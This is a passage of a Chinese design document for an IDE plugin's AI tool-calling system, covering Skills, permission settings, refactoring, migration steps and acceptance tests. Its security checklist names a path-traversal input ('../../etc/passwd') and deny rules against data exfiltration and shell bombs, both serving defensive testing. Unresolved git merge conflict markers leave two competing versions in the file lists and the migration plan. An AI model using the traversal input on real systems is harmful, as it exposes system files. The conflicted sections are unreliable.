> **变更说明**：v3.2 中此校验原设计为 `McpToolSanitizeHook` Pre-Hook 实现。现改为 Dispatcher 内置逻辑，原因：安全校验不应依赖 Hook 注册的正确性——如果开发者忘记注册 Hook，MCP 工具将跳过校验。Hook 层保留给用户自定义的额外校验（如业务规则检查），基础安全校验由 Dispatcher 保证。

---

## 11. Skills 架构（M6）

> Skills 是比 Tool 更高级的抽象：Tool 是**单步原子操作**，Skill 是**多步编排能力**。参考 Claude Code 设计，Skill 的本质是 **Command**（类型为 `prompt`），通过统一的 `SkillTool` 调度，而非为每个 Skill 注册独立 Tool。

### 11.1 Skill 不是 Tool，而是 Command

```
用户输入 /review-pr
       ↓
   SkillTool.call({ skill: "review-pr", args: "PR #123" })
       ↓
   查找 Command 注册表 → 找到 review-pr skill
       ↓
   skill.getPromptForCommand(args, ctx) → 展开为 prompt
       ↓
   执行模式:
     ├─ inline: prompt 注入当前对话，模型自行编排多步工具调用
     └─ fork:   启动独立子 Agent 执行，有自己的 token budget
```

**为什么用 Command 而非 Tool**：
- 模型只看到一个 `SkillTool`，不用为每个 skill 注册独立 Tool，节省 token
- Skill 的 prompt 在调用时才加载（懒加载），不影响每次 API 请求的 tools 参数大小
- Skill 可以限制可用工具范围（`allowed-tools`），实现最小权限原则

### 11.2 Skill 来源

| 来源 | 路径 | 加载时机 |
|------|------|----------|
| 磁盘 Skill | `.codeplan/skills/*/SKILL.md` | 启动时加载 frontmatter，调用时加载 body |
| 内置 Skill | 编译进插件 | 插件启动时注册 |
| MCP Prompt | MCP Server 的 `prompts/list` | MCP 连接建立后 |

### 11.3 SKILL.md 格式

```yaml
---
name: review-pr
description: 审查指定的 Pull Request
allowed-tools: [read_file, grep_files, run_command]  # 限制 skill 可用的工具
model: sonnet                   # 模型覆盖（可选）
context: inline                  # inline（默认）或 fork
arguments: [pr-number]           # 参数声明（可选）
argument-hint: "<pr-number>"     # 参数提示（可选）
when-to-use: "用户要求审查 PR 时使用"  # 使用场景说明
paths: ["**/*.kt"]               # 条件激活（匹配文件路径时自动推荐）
user-invocable: true             # 用户是否可直接 / 调用
---

Skill 的 prompt 正文（Markdown）
支持 $ARGUMENTS / ${1} 参数替换
```

### 11.4 两种执行模式

#### Inline（默认）

Skill prompt 展开为当前对话中的 user message：

```
SkillTool.call()
  → 查找 skill → getPromptForCommand(args, ctx)
  → 展开为 user message 注入当前对话
  → contextModifier: 限制 allowedTools、覆盖 model
  → 模型在当前对话中自行编排多步工具调用
```

- 适用于简单 Skill（如"生成 commit message"）
- 复用当前对话上下文，模型可以看到之前的消息

#### Fork

启动独立子 Agent 执行：

```
SkillTool.call()
  → prepareForkedCommandContext()
  → 创建独立 Agent（有自己的 system prompt、context、tool budget）
  → 执行 skill prompt
  → 返回 { status: 'forked', result: "..." }
  → 进度通过 onProgress 回调报告
```

- 适用于复杂 Skill（如"全项目代码审查"）
- 隔离执行，不污染当前对话上下文
- 有独立的 token budget 限制

### 11.5 懒加载与 Token 优化

磁盘 Skill 分两阶段加载：

| 阶段 | 加载内容 | 用途 |
|------|----------|------|
| 启动时 | frontmatter（name、description、when-to-use） | 注册表构建、token 预算估算 |
| 调用时 | 完整 prompt body | 实际执行 |

```kotlin
fun estimateFrontmatterTokens(skill: Skill): Int {
    val text = listOfNotNull(skill.name, skill.description, skill.whenToUse)
        .joinToString(" ")
    return roughTokenEstimation(text)
}
```

### 11.6 条件激活与动态发现

**条件激活**：`paths` frontmatter 声明文件匹配模式，当用户操作的文件匹配时自动推荐对应 Skill。

```
paths: ["src/test/**/*.kt"]
→ 用户编辑 src/test/MainTest.kt 时
→ 自动推荐 "generate-test" skill
```

**动态发现**：用户打开项目文件时，沿路径向上搜索 `.codeplan/skills/` 目录，支持嵌套项目（monorepo 中子项目可以有自己的 Skills）。

### 11.7 Skill 权限控制

```kotlin
fun authorizeSkill(skill: Skill): AuthDecision {
    // 安全属性白名单：只包含这些属性的 skill 自动放行
    val SAFE_PROPERTIES = setOf("name", "description", "model", "source")

    if (skill.properties.all { it.key in SAFE_PROPERTIES }) {
        return AuthDecision.ALLOW
    }

    // 有白名单外属性（如 hooks、allowedTools）→ 需用户确认
    return AuthDecision.ASK("Execute skill: ${skill.name}?")
}
```

| 属性 | 是否安全 | 原因 |
|------|----------|------|
| `name` / `description` | 安全 | 纯元数据 |
| `model` | 安全 | 只影响模型选择 |
| `when-to-use` | 安全 | 只影响推荐时机 |
| `allowed-tools` | **需确认** | 限制了 skill 可用的工具范围，可能扩大权限 |
| `hooks` | **需确认** | 注入自定义行为 |
| `context: fork` | **需确认** | 启动子 Agent，消耗额外资源 |

### 11.8 与 Tool 系统的集成

Skill 通过唯一的 `SkillTool` 接入 ToolRegistry：

```kotlin
val SKILL_TOOL = ToolSpec(
    name = "execute_skill",
    description = "Execute a named skill. Available skills: ...",
    inputSchema = jsonObjectOf(
        "type" to "object",
        "properties" to jsonObjectOf(
            "skill" to jsonObjectOf("type" to "string", "description" to "Skill name"),
            "args" to jsonObjectOf("type" to "string", "description" to "Skill arguments")
        ),
        "required" to jsonArray("skill")
    ),
    requiredPermission = READ_ONLY,  // Skill 本身是 prompt 展开，不直接产生副作用
    executor = SkillExecutor(skillRegistry)
)
```

模型看到的 `execute_skill` 工具只有一个，具体 Skill 的 prompt 在调用时动态加载。注册表中维护一个独立的 `SkillRegistry`（与 `ToolRegistry` 平行），管理 Skill 的发现、加载、缓存。

---

## 12. Settings 扩展

### 11.1 新增配置项

在 `SettingsState` 和 `SettingsFormState` 中新增：

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `permissionMode` | PermissionMode | `WORKSPACE_WRITE` | 全局权限等级（使用 3.4 定义的枚举，持久化时序列化为字符串） |
| `trustedMcpServers` | List<String> | `[]` | 已信任的 MCP server 列表 |
| `allowSessionFileTrust` | Boolean | `true` | 是否在文件审批框中展示"信任本次会话"选项（§8.7.3） |
| `diffSummaryThreshold` | Int | `100` | diff 行数超过此阈值时启用摘要模式（§8.6） |

### 11.2 Settings UI

在现有 "Command Execution" 区块上方新增权限模式选择：

```
Permission Level     [ Workspace Write ▼ ]

  ● Read Only       — 只允许只读操作和只读命令
  ● Workspace Write — 允许项目内读写操作（默认，推荐）
  ● Full Access     — 允许任意命令执行

File Change Review
  ☑ Show "Trust this session" option in review dialogs
  Diff summary threshold    [ 100 ] lines

Command Execution                           [Toggle: OFF/ON]
─────────────────────────────────────────────────────────────
Allowed Commands (base command prefix matching)
  ┌──────────┬──────────────────────────────────────────┐
  │ cargo    │                                     [✕] │
  │ git      │                                     [✕] │
  │ ...      │                                         │
  └──────────┴──────────────────────────────────────────┘
Execution timeout    [ 30 ] seconds

MCP Server Trust
  ┌──────────────────┬─────────────┐
  │ Server           │ Trusted     │
  ├──────────────────┼─────────────┤
  │ (连接后自动列出) │             │
  └──────────────────┴─────────────┘
```

---

## 13. ChatService 重构

### 13.1 删除的代码（约 120 行）

> **注意**：Phase 2 已删除 `bridgeNotifiedStart` 集合、延迟 `notifyStart` 逻辑和 `notifyRemoveMessage` hack。以下仅列出统一工具设计额外删除的代码。

> **注意**：Phase 2 已删除 `bridgeNotifiedStart` 集合、延迟 `notifyStart` 逻辑和 `notifyRemoveMessage` hack。以下仅列出统一工具设计额外删除的代码。

| 方法/字段 | 原因 |
|-----------|------|
| `runCommandToolDefinition()` | 移到 ToolSpecs.kt 常量 |
| `executeToolCallWithApproval()` | 移到 ToolCallDispatcher.dispatch() |
| `pendingApprovals` 字段 | 移到 ToolCallDispatcher |
| `onApprovalResponse()` 方法体 | 委托给 ToolCallDispatcher |
| `PreparedToolCall` 内部类 | 移到 ToolCallDispatcher |
| `CompletedToolCall` 内部类 | 移到 ToolCallDispatcher |
| `prepareToolCallsForExecution()` | 逻辑移到 ToolCallDispatcher |
| 白名单/路径检查逻辑 | 移到 ToolCallDispatcher.authorize() |

### 13.2 替换后的代码（约 15 行）

**handleToolCallComplete()**：

```
旧: prepareToolCallsForExecution → 循环 executeToolCallWithApproval → continueWithToolResults
新: 解析 tool call 参数 → 循环 dispatcher.dispatch() → continueWithToolResults
```

**sendMessage() / sendMessageInternal()**：

```
旧: tools = if (commandExecutionEnabled) listOf(runCommandToolDefinition()) else null
新: tools = if (toolsEnabled) dispatcher.buildToolsParam() else null
```

**onApprovalResponse()**：

```
旧: chatService 内部处理 pendingApprovals
新: dispatcher.onApprovalResponse(requestId, decision)
```

### 13.3 不变的部分

- SSE 状态机（STREAMING_TEXT → ACCUMULATING_TOOL_CALL → WAITING_RESULT）
- Token 流式渲染
- Session 持久化
- Context 注入
- System prompt 构建

---

## 14. 现有实现保留与变更总览

### 14.1 保留不动

| 组件 | 原因 |
|------|------|
| `ToolCallAccumulator` | SSE 解析层，与工具协议无关 |
| `SseChunkParser` | 提取 ToolCallDelta，通用 |
| `OkHttpSseClient` | HTTP/SSE 客户端，不涉及工具逻辑 |
| `CommandExecutionService` | BashExecutor/GrepExecutor 包装它，不改内部 |
| `ExecutionResult` | 只新增 `toToolResult()` 扩展方法 |
| `ExecutionCard.tsx` | 展示逻辑通用，扩展支持非命令工具即可 |

### 14.2 重构变更

| 组件 | 变更 |
|------|------|
| `ChatService.kt` | 删除 ~120 行硬编码工具逻辑，替换为 ~15 行 Dispatcher 调用 |
<<<<<<< Updated upstream
| `BridgeHandler.kt` | `notifyApprovalRequest` payload 增加 `toolName`；新增 `notifyFileChangeRequest` / `notifyFileCreateRequest`，均走 `buildEventJS()` 统一通道 |
| `bridge.d.ts` | 新增 `fileChangeResponse` / `fileCreateResponse` 动作方法 |
| `groupReducer.ts` | 新增 `file_change_request` / `file_create_request` case；`approval_request` case 扩展 `toolName` 分支 |
| `ApprovalDialog.tsx` | 扩展支持多种工具类型的审批展示 |
| `FileChangeDialog.tsx` | **新增** — unified diff 审批组件 |
| `FileCreateConfirmDialog.tsx` | **新增** — 新建文件确认组件 |
| `App.tsx` | 新增 `FileChangeDialog` / `FileCreateConfirmDialog` 渲染 + `window.__bridge` 动作方法调用 |
=======
| `BridgeHandler.kt` | `notifyApprovalRequest` payload 增加 `toolName`；新增 `file_change_auto` 通知；新增 `openFile` 动作注入；移除旧的 `fileChangeResponse`/`fileCreateResponse` |
| `bridge.d.ts` | 新增 `openFile` 动作方法；移除 `fileChangeResponse`/`fileCreateResponse`（审批改用 IDE 原生组件） |
| `groupReducer.ts` | 新增 `file_change_auto` case（信任模式变更通知）；`approval_request` case 扩展 `toolName` 分支 |
| `ApprovalDialog.tsx` | 扩展支持多种工具类型的审批展示 |
| `FileChangeInline.tsx` | **新增** — 信任模式下聊天流中的文件变更内联提示 |
| `App.tsx` | 新增 `FileChangeInline` 渲染；注入 `openFile` 回调；移除旧版 WebView diff 组件 |
>>>>>>> Stashed changes

---

## 15. 文件变更清单

<<<<<<< Updated upstream
### 14.1 新建文件（19 个）

**Kotlin 后端（16 个）：**
=======
### 15.1 新建文件（27 个）

**Kotlin 后端（24 个）：**
>>>>>>> Stashed changes

| 文件 | 说明 |
|------|------|
| `execution/ToolResult.kt` | 统一结果类型 |
| `execution/ToolContext.kt` | 工具执行上下文 |
| `execution/ToolSpec.kt` | 工具注册信息 + 动态能力声明 |
| `execution/PermissionMode.kt` | 权限等级枚举 |
| `execution/ToolExecutor.kt` | 执行器接口 |
| `execution/ToolHook.kt` | Pre/Post Hook 接口 |
| `execution/ToolRegistry.kt` | 注册中心 |
| `execution/ToolCallDispatcher.kt` | 统一调度器（含 MCP 基础参数校验） |
| `execution/FileChangeReview.kt` | 文件写操作 diff 审批 + 新建文件确认 |
| `execution/FileWriteLock.kt` | 文件级并发写锁 |
| `execution/ToolSpecs.kt` | 6 个工具的 ToolSpec 定义 |
| `execution/executors/BashExecutor.kt` | bash 执行器 + 动态分级 |
| `execution/executors/ReadFileExecutor.kt` | 文件读取（行号分块） |
| `execution/executors/ListFilesExecutor.kt` | 目录列表 |
| `execution/executors/GrepFilesExecutor.kt` | IntelliJ Search API 文本搜索 |
| `execution/executors/EditFileExecutor.kt` | 精确替换 + IDE 原生 diff 审批 |
| `execution/executors/WriteFileExecutor.kt` | 整文件写入 + IDE 原生确认/diff 审批 |
| `execution/PostEditPipeline.kt` | Post-Edit 质量管线（optimize imports + reformat + inspection） |
| `execution/InlineChangeHighlighter.kt` | 信任模式下的编辑器内联变更高亮 |
| `execution/hooks/ToolExecutionLogger.kt` | 工具调用日志 Hook（默认实现） |
| `execution/mcp/McpConnectionManager.kt` | MCP 连接管理（传输、心跳、重连） |
| `execution/mcp/McpToolFactory.kt` | MCP 工具包装（annotations 映射 + schema 同步） |
| `execution/skills/SkillRegistry.kt` | Skill 注册表（懒加载、条件激活） |
| `execution/skills/SkillExecutor.kt` | Skill 执行器（inline / fork 模式） |

<<<<<<< Updated upstream
**React 前端（3 个）：**

| 文件 | 说明 |
|------|------|
| `components/FileChangeDialog.tsx` | 文件修改 diff 审批组件 |
| `components/FileCreateConfirmDialog.tsx` | 新建文件确认组件 |
| `types/tool-review.d.ts` | 文件审批相关类型定义 |

### 14.2 修改文件
=======
**React 前端（5 个）：**

| 文件 | 说明 |
|------|------|
| `components/FileChangeInline.tsx` | 聊天流中的文件变更内联提示（信任模式 §8.4） |
| `components/McpServerStatus.tsx` | MCP Server 连接状态展示组件 |
| `components/McpServerStatus.tsx` | MCP Server 连接状态展示组件 |
| `components/SkillCard.tsx` | Skill 推荐卡片（条件激活时展示） |
| `types/tool-review.d.ts` | 文件审批相关类型定义 |

### 15.2 修改文件
>>>>>>> Stashed changes

| 文件 | 变更 |
|------|------|
| `ChatService.kt` | 删除硬编码工具逻辑，改用 ToolCallDispatcher |
| `ExecutionResult.kt` | 新增 `toToolResult()` 转换方法 |
<<<<<<< Updated upstream
| `BridgeHandler.kt` | `notifyApprovalRequest` payload 扩展；新增 `notifyFileChangeRequest` / `notifyFileCreateRequest`（走 `buildEventJS` 统一通道）；新增 `fileChangeResponse` / `fileCreateResponse` 动作注入 |
| `bridge.d.ts` | 新增 `fileChangeResponse` / `fileCreateResponse` 动作方法；更新 `approval_request` payload 类型 |
| `groupReducer.ts` | 新增 `file_change_request` / `file_create_request` case；`approval_request` case 扩展 `toolName` 分支 |
| `ApprovalDialog.tsx` | 扩展支持多工具类型审批（根据 `toolName` 切换 UI） |
| `App.tsx` | 新增 `FileChangeDialog` / `FileCreateConfirmDialog` 渲染；注入 `fileChangeResponse` / `fileCreateResponse` 回调 |
=======
| `BridgeHandler.kt` | `notifyApprovalRequest` payload 扩展；新增 `file_change_auto` 通知；新增 `openFile` 动作注入；移除旧版 `fileChangeResponse`/`fileCreateResponse` |
| `bridge.d.ts` | 新增 `openFile` 动作方法；移除 `fileChangeResponse`/`fileCreateResponse`；更新 `approval_request` payload 类型 |
| `groupReducer.ts` | 新增 `file_change_auto` case；`approval_request` case 扩展 `toolName` 分支 |
| `ApprovalDialog.tsx` | 扩展支持多工具类型审批（根据 `toolName` 切换 UI） |
| `App.tsx` | 新增 `FileChangeInline` 渲染；注入 `openFile` 回调 |
>>>>>>> Stashed changes
| `SettingsState` + Settings UI | 新增 permissionMode 字段和 UI |

### 15.3 不动文件

| 文件 | 原因 |
|------|------|
| `CommandExecutionService.kt` | BashExecutor 和 GrepExecutor 包装它，不改内部 |
| `ToolCallAccumulator.kt` | SSE 解析层不变 |
| `ExecutionCard.tsx` | 展示逻辑通用，无需修改（Phase 2 已将其归入 `AssistantGroup`） |
| `useBridge.ts` | Phase 1 已统一为 `onEvent`，无需改动 |
| `AssistantGroup.tsx` | Phase 2 新增组件，无需改动 |
| `AssistantMarkdown.tsx` | Phase 2 新增组件，无需改动 |

---

## 16. 迁移步骤

> **前置条件**：Phase 1（统一事件通道）和 Phase 2（消息分组）已完成。

> **前置条件**：Phase 1（统一事件通道）和 Phase 2（消息分组）已完成。

| 步骤 | 内容 | 依赖 | 涉及文件 |
|------|------|------|----------|
| **Step 1** | 核心类型（纯新增） | 无 | ToolResult、ToolContext、ToolSpec、PermissionMode、ToolExecutor |
| **Step 2** | ToolRegistry + FileWriteLock | Step 1 | ToolRegistry、FileWriteLock |
| **Step 3** | 读取类执行器 | Step 2 | BashExecutor、ReadFileExecutor、ListFilesExecutor、GrepFilesExecutor |
| **Step 4** | 写入类执行器 + 审批机制 | Step 2 | EditFileExecutor、WriteFileExecutor、FileChangeReview、FileWriteLock |
| **Step 5** | ToolCallDispatcher | Step 3, 4 | ToolCallDispatcher |
<<<<<<< Updated upstream
| **Step 6** | ChatService 重构 | Step 5 | ChatService.kt（重构） |
| **Step 7** | Bridge 事件扩展（`buildEventJS` + 动作注入） | Step 5 | BridgeHandler、bridge.d.ts |
| **Step 8** | 前端扩展（groupReducer + 审批组件 + Settings） | Step 7 | groupReducer、ApprovalDialog、FileChangeDialog、FileCreateConfirmDialog、App.tsx、SettingsState |
| **Step 9** | 测试 & 清理 | Step 8 | 测试文件、删除废弃代码 |
=======
| **Step 6** | ChatService 重构（高风险，建议 feature flag 保护） | Step 5 | ChatService.kt（重构） |
| **Step 7** | Bridge 事件扩展（`buildEventJS` + 动作注入） | Step 5 | BridgeHandler、bridge.d.ts |
| **Step 8** | 前端扩展（groupReducer + 变更通知组件 + Settings） | Step 7 | groupReducer、ApprovalDialog、FileChangeInline、App.tsx、SettingsState |
| **Step 9** | MCP 连接管理 + 工具注册 | Step 2 | McpConnectionManager、McpToolFactory |
| **Step 10** | MCP 前端（Server 状态展示 + Settings 信任配置） | Step 8, 9 | McpServerStatus、groupReducer、SettingsState |
| **Step 11** | Skills 加载与执行 | Step 5 | SkillRegistry、SkillExecutor、SkillTool（ToolSpec） |
| **Step 12** | Skills 前端（推荐卡片 + `/` 触发） | Step 8, 11 | SkillCard、groupReducer |
| **Step 13** | 集成测试 & 清理 | Step 12 | 测试文件、删除废弃代码 |
>>>>>>> Stashed changes

每个步骤完成后可独立验证。

### 16.1 Step 6 风险控制

ChatService 重构是风险最高的步骤（删除 ~120 行替换为 ~15 行）。建议：

- 在 `SettingsState` 中增加 `unifiedToolsEnabled: Boolean` 开关（默认 `true`）
- 旧代码路径保留，当开关关闭时回退到原有 `run_command` 硬编码逻辑
- Step 7-8 完成并验证通过后，在下一个版本中移除旧路径和 feature flag

### 16.2 错误恢复与超时策略

| 场景 | 策略 | 说明 |
|------|------|------|
| 工具执行超时 | `run_command` 使用 `commandTimeoutSeconds`；其他工具由 Dispatcher 设置全局超时（默认 120s） | 超时返回 `ToolResult(ok=false)`，不中断 Agent Loop |
| SSE 连接中断 | Dispatcher 检测到连接断开时，取消所有 `pendingApprovals` | `suspendCancellableCoroutine` 的 `invokeOnCancellation` 清理状态 |
| MCP 工具调用失败 | 不重试，直接返回 `ToolResult(ok=false)` | AI 根据 `ok=false` 自行决定是否重试 |
| 审批超时 | `withTimeout(60_000)` 自动拒绝 | 见 7.4 |
| 工具执行异常 | Dispatcher 的 `try/catch` 兜底 | 返回 `ToolResult(ok=false, error.message)` |

---

## 17. 验收标准

### 功能验收

- [ ] 6 个内置工具均可在 Chat 中通过 AI 自主调用
- [ ] `run_command` 的三级权限分级正确生效
- [ ] `read_file` 支持按行分块读取，截断时提示模型继续
- [ ] `edit_file` 在 search 文本不存在或多次匹配时返回清晰错误
- [ ] `grep_files` 在无外部 rg 时仍可通过 IntelliJ API 正常搜索
- [ ] 文件修改弹出 IDE 原生 DiffDialog（与 Git diff 同组件），用户可 Accept / Reject
- [ ] 新建文件弹出 IDE 原生 ConfirmDialog，内容使用 EditorTextField 展示
- [ ] DiffDialog 支持 F7 / Shift+F7 变更导航和语法高亮
- [ ] diff 超过 100 行时 DiffDialog 顶部展示摘要条（含涉及函数/类名）
- [ ] 信任模式下文件写入后，编辑器展示内联高亮（与 Git uncommitted changes 一致）
- [ ] 信任模式下变更可通过 Ctrl+Z 撤销
- [ ] Post-Edit 管线自动执行 Optimize Imports + Reformat Code
- [ ] Post-Edit 管线异步执行 Inspection，error 级别反馈给 AI
- [ ] 前端"Open in Editor"按钮可打开 IDE 编辑器并定位到变更区域
- [ ] DiffDialog 勾选"Trust this session"后，后续文件修改进入信任模式
- [ ] 新对话或 IDE 重启后，会话信任状态重置为 false
- [ ] Settings 中 `allowSessionFileTrust = false` 时 DiffDialog 不展示信任选项
- [ ] 同文件并发写入串行执行，不丢失修改
- [ ] Settings 切换 permissionMode 后行为立即变化
- [ ] IDE 重启后 Settings 配置保留
- [ ] `dispatchAll` 动态分区：`run_command cat` 与 `read_file` 可并发执行
- [ ] 多 tool_call 结果按原始顺序返回（不因并发打乱）
- [ ] 工具输出超过 50KB 时自动截断，`truncated=true` 且 `outputPath` 有值
- [ ] 截断后的 `outputPath` 可通过 `read_file` 读取完整内容
- [ ] Pre-Hook 返回非 null ToolResult 时跳过 executor 执行
- [ ] Post-Hook 在工具执行后（含失败、含拦截）均被调用
- [ ] Pre-Hook 拦截后不调用后续 Pre-Hook（短路语义）
- [ ] Hook 抛出异常时不阻断工具执行流程
- [ ] 单轮 Agent Loop tool_call 超过 20 次时终止循环
- [ ] 单次 API 响应 tool_call 超过 10 个时拒绝执行

### 安全验收

- [ ] 路径穿越攻击被阻止（`../../etc/passwd`）
- [ ] workspace 外的路径访问被拒绝
- [ ] deny_rules 6 条初始规则均生效（危险删除、网络外泄、Shell 炸弹、权限提升）
- [ ] ToolCallDispatcher.dispatch 永不抛出未捕获异常（try/catch 兜底）
- [ ] 审批超时 60 秒自动拒绝
- [ ] MCP 工具默认需审批，加入信任列表后才自动放行
- [ ] MCP 工具参数超过 1MB 时被拒绝（Dispatcher 内置校验，非 Hook）
- [ ] MCP 工具缺少必填参数时被拒绝
- [ ] 单次 API 响应超过 10 个 tool_call 时拒绝执行
- [ ] 单轮 Agent Loop 超过 20 次 tool_call 时终止循环

### 回归验收

- [ ] 现有 `CommandExecutionServiceTest` 全部通过
- [ ] Chat SSE 流式输出不受影响
- [ ] Session 持久化不受影响
- [ ] 前端现有功能（Chat、Settings、Commit 生成）不受影响
- [ ] 工具功能关闭时（`commandExecutionEnabled=false`）行为与现有一致

### MCP 验收

- [ ] `ToolExecutor` 接口可被 MCP 工具实现
- [ ] `addTools` 去重机制正确工作
- [ ] `removeTool` 可正确移除工具
- [ ] `dispose` 反序调用所有清理函数
- [ ] MCP `annotations.readOnlyHint` 正确映射到 `isConcurrencySafe` / `isReadOnly`
- [ ] MCP `annotations.destructiveHint` 正确映射到 `isDestructive`
- [ ] 未声明 annotations 的 MCP 工具，所有能力方法默认返回 `false`（fail-closed）
- [ ] stdio MCP Server 可正常连接、listTools、调用、断开
- [ ] SSE MCP Server 可正常连接、listTools、调用、断开
- [ ] MCP Server 断开后，其工具从 Registry 移除，AI 不再调用
- [ ] MCP Server 重连后，工具自动重新注册
- [ ] Server 主动通知 `tools/list_changed` 时，差异更新 Registry
- [ ] Schema 变更的工具（inputSchema hash 不同）被正确更新
- [ ] 心跳超时触发自动重连（指数退避）

### Skills 验收

- [ ] `SkillRegistry` 可加载 `.codeplan/skills/*/SKILL.md` 的 frontmatter
- [ ] Skill 完整 prompt 在调用时才加载（懒加载）
- [ ] `execute_skill` 工具在 `buildOpenAiTools()` 中注册为单一工具
- [ ] inline 模式：Skill prompt 注入当前对话，模型自行编排工具调用
- [ ] fork 模式：启动独立子 Agent，有独立 token budget
- [ ] `paths` 条件激活：匹配文件时自动推荐对应 Skill
- [ ] 只含安全属性的 Skill 自动放行（不弹确认框）
- [ ] 含 `allowed-tools` / `hooks` 的 Skill 需用户确认

---

## 附录 A：变更摘要

<<<<<<< Updated upstream
=======
### v3.2 → v3.3（代码审查优化）

| # | 变更 | 原因 |
|---|------|------|
| 1 | deny_rules 补充初始规则列表（6 条） | 原"黑名单"无具体内容，实现时无据可依 |
| 2 | FileWriteLock 移除 TOCTOU 清理逻辑，改为 dispose 时整体清理 | `isLocked` 检查和 `remove` 之间存在竞态，且 locks Map 大小受限于文件数量不构成内存问题 |
| 3 | `parallelMap` 改为 `coroutineScope { map { async }.awaitAll() }` 标准协程模式 | Kotlin 标准库无 `parallelMap`，避免实现时困惑 |
| 4 | `approval_request` 双字段过渡明确标注 v3.3 移除 `command` 字段 | 避免 deprecated 字段长期残留 |
| 5 | MCP 基础参数校验从 Hook 改为 Dispatcher 内置逻辑 | 安全校验不应依赖 Hook 注册的正确性，Hook 层预留给用户自定义校验 |
| 6 | `grep_files` 降级路径补充权限说明（内部调用自动放行） | 降级命令通过 CommandExecutionService 执行，需明确是否走审批 |
| 7 | `write_file` 新建文件确认从"前 20 行预览"改为"完整内容可滚动展示" | 20 行预览不足以让用户判断 500 行文件的安全性 |
| 8 | 新增工具调用频率限制（§6.5） | 防止 AI 无限循环调用工具 |
| 9 | ToolHook 执行语义明确化（Pre-Hook 短路 + Post-Hook 全执行 + 异常不阻断） | 原设计未定义多 Hook 拦截策略和异常处理 |
| 10 | `BackgroundTask.status` 补充枚举值定义 | 消除未定义类型 |
| 11 | §4.2 补充生命周期管理章节 | 修复原 4.1 → 4.3 节号跳跃 |
| 12 | 文件变更清单计数修正（22 → 20） | 原列表 21 个但实际 22，MCP 校验内置后减为 20 |
| 13 | 新增大 diff 摘要模式（§8.6） | diff 超 100 行时默认展示摘要（涉及函数/类名），降低用户阅读负担 |
| 14 | 新增审批疲劳缓解机制（§8.7） | 支持会话级信任——勾选后后续文件修改自动执行，仅展示内联变更通知 |
| 15 | Settings 新增 `allowSessionFileTrust`、`diffSummaryThreshold` 配置项 | 控制信任选项可见性和摘要阈值 |
| 16 | MCP 工具能力协商：映射 `annotations` 到 `isConcurrencySafe`/`isReadOnly`/`isDestructive`（§10.4） | MCP 工具可声明只读/破坏性，参与并发调度优化，不再全部串行 |
| 17 | MCP 传输层与连接管理（§10.5）：stdio + SSE 双传输、心跳、指数退避重连 | MCP 连接不再是黑盒，可观测可恢复 |
| 18 | MCP Schema 热更新（§10.6）：`tools/list_changed` 通知 → 差异更新 Registry | MCP Server 升级接口后无需重启连接 |
| 19 | Skills 架构（§11）：Skill = Command，通过 SkillTool 统一调度，支持 inline/fork 两种模式 | 与 MCP 一起纳入本次实现，不再延后到 Phase 5 |
| 20 | Skills 懒加载 + 条件激活 + 权限控制（§11.5-11.7） | Token 优化和安全控制 |
| 21 | MCP 和 Skills 从"预留"升级为同步实现，迁移步骤扩展为 13 步（原 9 步） | 用户要求一次到位，不做分期 |
| 22 | §8 完全重写为"IDE 原生文件变更体验"——审批改用 IntelliJ DiffDialog / ConfirmDialog，信任模式改用编辑器内联高亮 + Ctrl+Z 撤销 | 这是 IDE 插件 vs CLI 的核心差异化，不能在 WebView 中模拟终端体验 |
| 23 | 新增 §8.5 Post-Edit 质量管线（Optimize Imports + Reformat Code + IDE Inspection） | CLI 工具做不到的 IDE 独有能力——AI 写完代码自动检查并反馈 |
| 24 | 移除 `file_change_request` / `file_create_request` Bridge 事件和 `FileChangeDialog` / `FileCreateConfirmDialog` 前端组件 | 审批改用 IDE 原生组件后，WebView diff 审批路径不再需要 |
| 25 | 新增 `openFile` Bridge 动作方法，前端"Open in Editor"可打开 IDE 编辑器定位到变更 | 前端与 IDE 编辑器的联动桥梁 |

### v3.1 → v3.2（调度模型优化）

| # | 变更 | 原因 |
|---|------|------|
| 1 | ToolSpec 新增动态能力声明（`isConcurrencySafe`/`isReadOnly`/`isDestructive`） | 静态 read/write 分类无法反映 `run_command` 动态分级的实际情况 |
| 2 | `dispatchAll` 改为动态分区模型（连续安全工具并发批次 + 非安全工具串行批次） | 替代粗粒度的 reads/writes 两档分类，提升并发效率 |
| 3 | 结果按原始 tool_call 顺序返回 | 模型需要有序结果理解因果关系 |
| 4 | 新增 Bash 错误级联策略（只读工具失败不级联） | 平衡安全性和效率：Bash 有隐式依赖需级联，Read 独立无需级联 |
| 5 | `ToolResult` 新增 `totalBytes`、`outputPath` 字段 | 支持大输出截断 + 持久化，防止 API 请求超限 |
| 6 | Dispatcher 新增输出截断步骤 | 工具输出超 50KB 自动截断并持久化到磁盘 |
| 7 | 新增 Pre/Post `ToolHook` 机制 | 为日志、指标、输入拦截等横切关注点预留扩展点 |
| 8 | MCP 工具新增基础参数校验（大小 + 必填） | 防止无效请求浪费网络往返 |
| 9 | 单工具限制为只操作一个文件路径 | 防止多文件操作在并发场景下导致死锁 |
| 10 | 文档版本号升为 v3.2 | 汇总本轮优化变更 |

### v3.0 → v3.1（代码审查修复）

| # | 变更 | 原因 |
|---|------|------|
| 1 | ToolRegistry 移除 `execute()` 方法，执行管线统一至 ToolCallDispatcher | 消除 Dispatcher 和 Registry 之间的职责重叠和重复查找 |
| 2 | 新增 7.2.1 并发调度模型（`dispatchAll`） | 明确多 tool_call 的并发/串行策略、部分失败策略、死锁预防 |
| 3 | `awaitApproval` 改用 `withTimeout` + `TimeoutCancellationException` | 修复原 `delay` + `resume` 的超时竞态，防止 `IllegalStateException` |
| 4 | `edit_file` 新增 `line_number` 参数用于消歧多处匹配 | 减少多匹配时 AI 往返次数 |
| 5 | `run_command` 动态分级增加"最佳努力"安全边界声明 | 明确管道/重定向中的恶意内容不在分级范围内，安全依赖审批兜底 |
| 6 | `read_file` 增加二进制文件检测和拒绝 | 避免将二进制内容传给模型 |
| 7 | `approval_request` 的 `command` 字段保留（deprecated）而非直接改名 | 避免前端 breaking change，双字段并行过渡一个版本 |
| 8 | `groupReducer` 审批状态改为 `Map<requestId, Review>` | 支持多个并发审批请求，防止互相覆盖 |
| 9 | Step 6 增加 feature flag 风险控制（`unifiedToolsEnabled`） | ChatService 重构风险最高，需可回退 |
| 10 | 新增 15.2 错误恢复与超时策略 | 补充工具超时、SSE 中断、MCP 失败等场景的处理策略 |
| 11 | `FileWriteLock` 增加 Mutex 清理逻辑 | 防止 `locks` Map 随文件路径无限增长 |
